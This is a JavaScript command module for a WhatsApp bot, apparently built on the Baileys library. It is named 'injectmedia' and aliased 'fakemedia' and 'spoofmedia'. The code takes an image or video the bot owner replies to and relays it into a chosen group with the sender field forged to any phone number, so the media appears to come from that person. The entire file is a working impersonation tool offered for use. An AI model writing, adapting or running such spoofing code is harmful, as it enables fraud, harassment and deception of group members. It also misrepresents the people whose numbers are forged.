module.exports = {
    name: "injectmedia",
    aliases: ["fakemedia", "spoofmedia"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const quoted = ctx.msg?.message?.imageMessage ||
                           ctx.msg?.message?.videoMessage ||
                           ctx.quoted?.message?.imageMessage ||
                           ctx.quoted?.message?.videoMessage;

            // usage: .injectmedia <number> <groupJid> [caption]
            // reply to an image/video with this command
            if (args.length < 2) {
                return await ctx.reply(
                    "*Usage:* Reply to an image/video with:\n" +
                    ".injectmedia <number> <groupJid> [caption]"
                );
            }

            if (!quoted) {
                return await ctx.reply("❌ Reply to an image or video first.");
            }

            const targetNumber = args[0].replace(/[^0-9]/g, "");
            const groupJid = args[1];
            const caption = args.slice(2).join(" ") || "";
            const spoofedJid = `${targetNumber}@s.whatsapp.net`;

            const isVideo = !!ctx.quoted?.message?.videoMessage;
            const mediaType = isVideo ? "videoMessage" : "imageMessage";

            // clone the quoted media message with spoofed sender
            const fakeMsg = {
                [mediaType]: {
                    ...quoted,
                    caption
                }
            };

            await sock.relayMessage(
                groupJid,
                fakeMsg,
                {
                    messageId: `FAKE_${Date.now()}`,
                    participant: spoofedJid,
                    additionalAttributes: {
                        participant: spoofedJid
                    }
                }
            );

            await ctx.reply(
                `✅ Media injected.\nSpoofed: +${targetNumber}\nGroup: ${groupJid}`
            );

        } catch (e) {
            console.error("[injectmedia]", e);
            await ctx.reply("❌ Failed: " + e.message);
        }
    }
};